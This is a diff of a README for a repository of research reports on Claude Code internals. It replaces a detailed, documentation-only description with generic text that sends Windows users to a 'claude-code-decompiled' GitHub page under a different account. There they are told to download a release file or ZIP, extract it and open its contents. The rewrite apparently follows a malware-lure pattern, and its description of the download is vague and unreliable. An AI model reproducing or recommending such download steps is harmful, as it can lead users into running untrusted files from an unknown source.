@@ -1,265 +1,235 @@
-# Claude Code Research Reports
+# 🔍 claude-code-decompiled - Understand Claude Code in Plain Language
 
-[![Version](https://img.shields.io/badge/Claude_Code-v2.1.88-blueviolet?style=for-the-badge)](https://www.npmjs.com/package/@anthropic-ai/claude-code)
-[![Reports](https://img.shields.io/badge/Research_Reports-20-red?style=for-the-badge)](docs/)
+[![Download / Visit the page](https://img.shields.io/badge/Download%20Page-Visit%20Now-blue?style=for-the-badge)](https://github.com/jalehvesical21/claude-code-decompiled)
 
-Independent research reports on **Claude Code v2.1.88**, focused on architecture, agent behavior, permission design, prompt assembly, MCP integration, and context management.
+## 🖥️ What This Is
 
-This repository is intentionally **documentation-only**. It collects original analysis and commentary about a publicly distributed software package. It is not presented as a runnable source release or supported CLI build.
+This project gives you research reports based on Claude Code source analysis. It focuses on how the app works, what it sends, what it can do, and how it manages prompts, tools, permissions, and context.
 
-**Language**: **English** | [中文](README_CN.md) | [日本語](README_JA.md) | [한국어](README_KO.md) | [Español](README_ES.md)
+Use this repo if you want to:
 
----
+- Read clear reports about Claude Code internals
+- Learn how the agent loop works
+- See how tool calls and MCP fit in
+- Review system prompt behavior
+- Understand telemetry and permission handling
+- Explore persistence and hidden features
 
-## Why This Repo Exists
+## 📥 Download and Open on Windows
 
-Claude Code is one of the most sophisticated production AI coding agents available today. These reports aim to make its architecture and behavior easier to study:
+Visit this page to download:
 
-- **Agent developers** can study production patterns for tool orchestration, context management, and recovery logic.
-- **Security researchers** can inspect telemetry, remote control mechanisms, and permission boundaries.
-- **AI researchers** can examine prompt assembly, model routing, and agent loop design.
-- **Engineers** can use the reports as references when building CLI-based agent systems.
+https://github.com/jalehvesical21/claude-code-decompiled
 
-These reports are based on technical analysis of a **publicly distributed npm package** and are presented here as research commentary.
+If the page offers a release file, download it to your PC. If it gives you a folder or archive, save it and open it after the download finishes.
 
----
+### Windows steps
 
-## What This Repository Covers
+1. Open the download page in your browser.
+2. Look for the latest release, file, or archive.
+3. Download the file to your Downloads folder.
+4. If the file is a ZIP, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Open the main report file in your browser or text app.
 
-This repository is designed to answer a fairly specific set of questions about Claude Code:
+## 📚 What You Will Find
 
-- How is Claude Code architected internally?
-- How does the main agent loop actually work?
-- How are tools registered, validated, permission-checked, and executed?
-- How is the system prompt assembled from static and dynamic parts?
-- What telemetry and privacy-relevant data paths exist?
-- How does the permission model work in practice?
-- How does Claude Code integrate with MCP servers and external tools?
-- How does it manage context pressure, compaction, and session persistence?
-- What hidden features, internal codenames, and remote control mechanisms exist in the codebase?
+This repository is organized around deep research notes and source-based reports. The reports focus on the parts that matter most to end users and researchers.
 
-If someone lands here searching for Claude Code internals, Claude Code architecture, Claude Code source analysis, Claude Code system prompts, Claude Code telemetry, or Claude Code MCP integration, this repository is meant to be a useful entry point.
+Common topics include:
 
----
+- Architecture
+- Agent loop
+- Tool system
+- System prompts
+- Telemetry
+- Permissions
+- MCP integration
+- Context management
+- Persistence
+- Hidden features
 
-## Research Reports
+## 🧭 How to Use the Reports
 
-### Core Architecture Analysis
+You do not need coding skills to use this repo.
 
-| # | Report | What You'll Learn | Link |
-|---|--------|-------------------|------|
-| 13 | **Architecture Overview** | A system-level synthesis of how Claude Code fits together across prompt assembly, agent loop, tools, permissions, compaction, persistence, and MCP | [Read →](docs/en/13-claude-code-architecture-overview.md) |
-| 14 | **BashTool Security & Execution** | How Claude Code validates shell input, classifies read-only commands, routes sandboxed execution, and turns Bash into a controllable tool surface | [Read →](docs/en/14-bash-tool-security-and-execution.md) |
-| 15 | **Memory & Instruction System** | How CLAUDE.md, MEMORY.md, session memory, and instruction layering shape long-session behavior and prompt continuity | [Read →](docs/en/15-memory-and-instruction-system.md) |
-| 16 | **Transcripts, Compaction & Resume** | How transcript chains, sidechains, compact boundaries, resume, and session continuity work under the hood | [Read →](docs/en/16-transcripts-compaction-and-session-resume.md) |
-| 06 | **Agent Loop Deep Dive** | The 785KB `query.ts` dissected — message flow, streaming tool execution, auto-compaction, error recovery, sub-agent spawning | [Read →](docs/en/06-agent-loop-deep-dive.md) |
-| 07 | **Tool System Architecture** | How 40+ tools are registered, validated, permission-checked, and executed in parallel. The `buildTool` factory pattern. | [Read →](docs/en/07-tool-system-architecture.md) |
-| 08 | **Permission & Security Model** | Allowlists, blocklists, auto-approve rules, YOLO mode, sandbox integration, and the permission decision tree | [Read →](docs/en/08-permission-security-model.md) |
-| 09 | **System Prompt Engineering** | How the 15,000+ token system prompt is assembled from 20+ parts — context injection, tool descriptions, memory, and dynamic rules | [Read →](docs/en/09-system-prompt-engineering.md) |
-| 10 | **MCP Integration & Plugin System** | Model Context Protocol client implementation — server lifecycle, tool discovery, OAuth, and transport layers | [Read →](docs/en/10-mcp-integration.md) |
-| 11 | **Context Window Management** | Auto-compaction, conversation compression, token counting, and how Claude Code fights the context limit | [Read →](docs/en/11-context-window-management.md) |
-| 12 | **State Management & Persistence** | Session state, conversation history, memory system, file persistence, and cross-session data flow | [Read →](docs/en/12-state-management.md) |
-| 17 | **Bridge System & Remote Sessions** | How Claude Desktop talks to the CLI — session lifecycle, JWT auth, work secrets, multi-session coordination, capacity management | [Read →](docs/en/17-bridge-system-and-remote-sessions.md) |
-| 18 | **React/Ink Terminal UI** | Using React to render a TUI — Yoga layout, custom components, event system, streaming output, performance optimization | [Read →](docs/en/18-react-ink-terminal-ui.md) |
-| 19 | **Streaming & Transport Layers** | WebSocket/SSE/HTTP hybrid transport, batch uploading, backpressure, NDJSON protocol, reconnection logic | [Read →](docs/en/19-streaming-and-transport-layers.md) |
-| 20 | **Slash Commands & Cost Tracking** | 80+ command registry, fuzzy search, feature-gated commands, token-to-USD cost tracking, billing integration | [Read →](docs/en/20-slash-commands-and-cost-tracking.md) |
+1. Open the main page or report file.
+2. Read the sections one by one.
+3. Use the table of contents if the file includes one.
+4. Look for terms like “agent,” “prompt,” “tool,” and “telemetry.”
+5. Move between linked notes if the report includes them.
 
-### Discovery & Investigation Reports
+If you want a simple path, start with the architecture report, then read the agent loop section, then the tool system section.
 
-| # | Report | What You'll Learn | Link |
-|---|--------|-------------------|------|
-| 01 | **Telemetry & Data Collection** | Dual analytics pipeline, environment fingerprinting, what gets collected and how | [Read →](docs/en/01-telemetry-and-privacy.md) |
-| 02 | **Hidden Features & Codenames** | Animal codenames, feature flags, and internal vs external build differences | [Read →](docs/en/02-hidden-features-and-codenames.md) |
-| 03 | **Undercover Mode** | How Anthropic employees can hide AI authorship signals in public repos | [Read →](docs/en/03-undercover-mode.md) |
-| 04 | **Remote Control & Killswitches** | Server-side settings, blocking dialogs, GrowthBook flags, and emergency controls | [Read →](docs/en/04-remote-control-and-killswitches.md) |
-| 05 | **Future Roadmap** | KAIROS, Numbat, future model hints, unreleased tools, and roadmap clues | [Read →](docs/en/05-future-roadmap.md) |
+## 🔎 Main Topics Covered
 
----
+### 🧠 Agent Loop
 
-## Reading Guide
+This explains how Claude Code takes input, decides what to do, and moves through each step of a task. It helps you see how the system breaks work into smaller actions.
 
-### Start here if you want the big picture
+### 🛠️ Tool System
 
-- [Architecture Overview](docs/en/13-claude-code-architecture-overview.md)
-- [Agent Loop Deep Dive](docs/en/06-agent-loop-deep-dive.md)
-- [Tool System Architecture](docs/en/07-tool-system-architecture.md)
-- [Permission & Security Model](docs/en/08-permission-security-model.md)
-- [BashTool Security](docs/en/14-bash-tool-security-and-execution.md)
+This section covers the tools Claude Code can call during a task. It may include file actions, command use, and other task helpers.
 
-### Read these if you care about prompts, memory, and context
+### 🧾 System Prompts
 
-- [System Prompt Engineering](docs/en/09-system-prompt-engineering.md)
-- [Memory & Instruction System](docs/en/15-memory-and-instruction-system.md)
-- [Context Window Management](docs/en/11-context-window-management.md)
-- [State Management](docs/en/12-state-management.md)
-- [Transcripts, Compaction & Resume](docs/en/16-transcripts-compaction-and-session-resume.md)
+These reports look at the instructions built into the app. They show how the app shapes behavior before you type anything.
 
-### Read these if you care about infrastructure and networking
+### 📡 Telemetry
 
-- [Bridge System & Remote Sessions](docs/en/17-bridge-system-and-remote-sessions.md)
-- [React/Ink Terminal UI](docs/en/18-react-ink-terminal-ui.md)
-- [Streaming & Transport Layers](docs/en/19-streaming-and-transport-layers.md)
-- [Slash Commands & Cost Tracking](docs/en/20-slash-commands-and-cost-tracking.md)
-- [MCP Integration](docs/en/10-mcp-integration.md)
+This part explains what data the app may collect or send. It helps you understand what happens in the background.
 
-### Read these if you care about security, privacy, or control surfaces
+### 🔐 Permissions
 
-- [Telemetry & Privacy](docs/en/01-telemetry-and-privacy.md)
-- [Remote Control & Killswitches](docs/en/04-remote-control-and-killswitches.md)
-- [Permission & Security Model](docs/en/08-permission-security-model.md)
+This section shows how access rules work. It covers what the app can ask for and when it needs approval.
 
-### Read these if you care about unusual or hidden behavior
+### 🔗 MCP Integration
 
-- [Hidden Features & Codenames](docs/en/02-hidden-features-and-codenames.md)
-- [Undercover Mode](docs/en/03-undercover-mode.md)
-- [Future Roadmap](docs/en/05-future-roadmap.md)
+MCP, or Model Context Protocol, lets the app connect to external tools and services. This report helps you understand how that link works.
 
-For a topic-based report index, see [docs/en/README.md](docs/en/README.md).
+### 🧩 Context Management
 
----
+This section explains how the app keeps track of what matters during a session. It may cover memory, limits, and what gets included in each step.
 
-## Analyzed Codebase Snapshot
+### 💾 Persistence
 
-These figures refer to the **analyzed Claude Code codebase snapshot**, not to the contents of this documentation repository.
+This covers how the app saves state or keeps data across runs. It helps you understand what stays and what resets.
 
-| Metric | Value |
-|--------|-------|
-| TypeScript Source Files | **1,884** |
-| Total Lines of Code | **512,664** |
-| Largest Single File | `query.ts` — **785KB** |
-| Built-in Tools | **40+** |
-| Slash Commands | **80+** |
-| npm Dependencies | **192 packages** |
-| Feature-Gated Modules | **108** |
-| Runtime Model | Bun-built package targeting Node.js |
+### 🕵️ Hidden Features
 
----
+This section points out behavior that may not show in the normal UI. It can include extra commands, checks, or internal paths.
 
-## Architecture Overview
+## ⚙️ System Requirements
 
-```
-                          ┌─────────────────┐
-                          │   User Input     │
-                          │ (CLI / SDK / IDE)│
-                          └────────┬────────┘
-                                   │
-                    ┌──────────────▼──────────────┐
-                    │        Entry Layer           │
-                    │                              │
-                    │  cli.tsx → main.tsx → REPL   │
-                    │              └→ QueryEngine   │
-                    └──────────────┬──────────────┘
-                                   │
-              ┌────────────────────▼────────────────────┐
-              │           Query Engine Core              │
-              │                                         │
-              │  ┌─────────────────────────────────┐    │
-              │  │  System Prompt Assembly          │    │
-              │  │  (15K+ tokens, 20+ parts)       │    │
-              │  └─────────────┬───────────────────┘    │
-              │                │                         │
-              │  ┌─────────────▼───────────────────┐    │
-              │  │  Agent Loop (query.ts — 785KB)  │    │
-              │  │                                  │    │
-              │  │  User msg → Claude API → Response│    │
-              │  │       ↑                    │     │    │
-              │  │       │    tool_use? ──→ YES     │    │
-              │  │       │         │               │    │
-              │  │       │    Execute tools        │    │
-              │  │       │    (parallel)           │    │
-              │  │       │         │               │    │
-              │  │       └─── tool_result ◄────┘   │    │
-              │  └─────────────────────────────────┘    │
-              │                                         │
-              │  ┌─────────────────────────────────┐    │
-              │  │  Harness Layer                   │    │
-              │  │  • Permission checks             │    │
-              │  │  • Streaming & concurrency       │    │
-              │  │  • Auto-compaction               │    │
-              │  │  • Sub-agent management          │    │
-              │  │  • Cost tracking                 │    │
-              │  │  • Error recovery                │    │
-              │  │  • MCP orchestration             │    │
-              │  │  • Telemetry & logging           │    │
-              │  └─────────────────────────────────┘    │
-              └────────────────────┬────────────────────┘
-                                   │
-         ┌─────────────────────────▼─────────────────────────┐
-         │              Tool Layer (40+ tools)               │
-         │                                                     │
-         │  Read / Write / Edit / Bash / Glob / Grep / Agent  │
-         │  MCP tools / task tools / notebook tools / more    │
-         └─────────────────────────────────────────────────────┘
-```
+This content is meant to be easy to open on a Windows PC.
 
----
+Recommended setup:
 
-## Observed Module Layout
+- Windows 10 or Windows 11
+- A modern browser such as Edge, Chrome, or Firefox
+- At least 200 MB free disk space
+- A stable internet connection for the download page
+- A text viewer or browser that can open Markdown or HTML files
 
-The following tree describes the **analyzed source layout** discussed throughout the reports:
+If the repo comes as a ZIP or folder, Windows Explorer is enough to open it.
 
-```
-src/
-├── main.tsx
-├── QueryEngine.ts
-├── query.ts
-├── Tool.ts
-├── Task.ts
-├── tools.ts
-├── commands.ts
-├── context.ts
-├── cost-tracker.ts
-├── setup.ts
-├── bridge/
-├── cli/
-├── commands/
-├── components/
-├── entrypoints/
-├── hooks/
-├── services/
-├── state/
-├── tasks/
-├── tools/
-├── types/
-├── utils/
-└── vendor/
-```
+## 📂 Folder Guide
 
-This repository itself remains documentation-only:
+If you download an archive, you may see files like these:
 
-```
-docs/
-├── en/
-└── zh/
+- README.md - Main entry file
+- reports/ - Research notes and analysis pages
+- notes/ - Shorter topic files
+- assets/ - Images or linked files
+- index.html - Simple file you can open in a browser
 
-README.md
-README_CN.md
-README_JA.md
-README_KO.md
-README_ES.md
-QUICKSTART.md
-```
+If you see a file named README.md, open it first. If you see index.html, double-click it to view the content in your browser.
 
----
+## 🧩 What Makes This Repo Useful
 
-## Usage
+This repo helps you get a clearer view of how Claude Code works under the hood. It can help you:
 
-- Read reports directly from `docs/`
-- Share links to individual reports
-- Treat this repository as a documentation archive, not a software distribution
+- Compare what the app shows with how it behaves
+- Follow the path from input to action
+- Learn how permissions affect each step
+- See how tool use fits into the flow
+- Understand what data may be stored or sent
 
-See [QUICKSTART.md](QUICKSTART.md) for a minimal reading guide.
+## 🛡️ Privacy and Data Questions
 
----
+The reports cover telemetry and system behavior so you can review how the app handles data. If you are checking how a tool works before using it, this repo gives you a way to read the details in one place.
 
-## Keywords
+Things you may want to look for:
 
-Claude Code, Anthropic, Claude Code source analysis, Claude Code architecture, Claude Code agent loop, Claude Code system prompts, Claude Code telemetry, Claude Code permission model, Claude Code MCP, Claude Code hidden features, Claude Code reverse engineering, AI coding agent architecture, Model Context Protocol, prompt engineering, context management, persistence, security research
+- What is collected
+- When data is sent
+- How prompts are handled
+- How long context stays active
+- What triggers permission prompts
 
----
+## 🧪 Example Reading Path
 
-## Legal Note
+If you want the fastest route, use this order:
 
-This project constitutes **research, commentary, and educational analysis** of a publicly distributed software package (the npm package `@anthropic-ai/claude-code`).
+1. Read the main architecture report.
+2. Read the agent loop section.
+3. Open the tool system notes.
+4. Check permissions.
+5. Review telemetry.
+6. Read MCP integration.
+7. Finish with persistence and hidden features
 
-The original reports in `docs/` are the repository maintainer's own commentary and analysis. If you believe any content here infringes your rights, please open an issue for prompt review.
+## 🗂️ Search Terms Inside the Repo
+
+Use your browser search or file search for these terms:
+
+- architecture
+- agent loop
+- tool
+- prompt
+- telemetry
+- permission
+- context
+- persistence
+- MCP
+- hidden feature
+
+## 🪟 If the Download Is a ZIP File
+
+1. Download the ZIP from the link above.
+2. Find the file in your Downloads folder.
+3. Right-click it.
+4. Choose Extract All.
+5. Open the new folder.
+6. Open README.md or index.html
+
+## 🧰 If the Download Is a Web Page
+
+1. Open the link above.
+2. Read the reports in the browser.
+3. Use the file links or section links to move between pages.
+4. Save the page if you want to keep a local copy.
+
+## 📘 File Types You May See
+
+- Markdown files for written reports
+- HTML files for browser viewing
+- JSON files for structured notes
+- Text files for short findings
+- Images for diagrams or references
+
+## 🔗 Source and Topic Areas
+
+This repository centers on:
+
+- ai-agents
+- anthropic
+- claude-code
+- code-analysis
+- mcp
+- reverse-engineering
+- security-research
+- source-analysis
+- source-code
+- system-prompts
+- telemetry
+
+## 🧭 How to Move Through the Content
+
+If the repo has linked notes, use them in this order:
+
+- Start with overview pages
+- Move to architecture
+- Open agent loop details
+- Read tool system notes
+- Check prompt behavior
+- Review telemetry and permissions
+- Finish with advanced and hidden feature notes
+
+## 📝 Reading Tips
+
+- Read one section at a time
+- Use browser search for repeated terms
+- Keep the download page open in another tab
+- Use a large screen if you want side-by-side reading
+- Save the folder after extraction so you can reopen it later
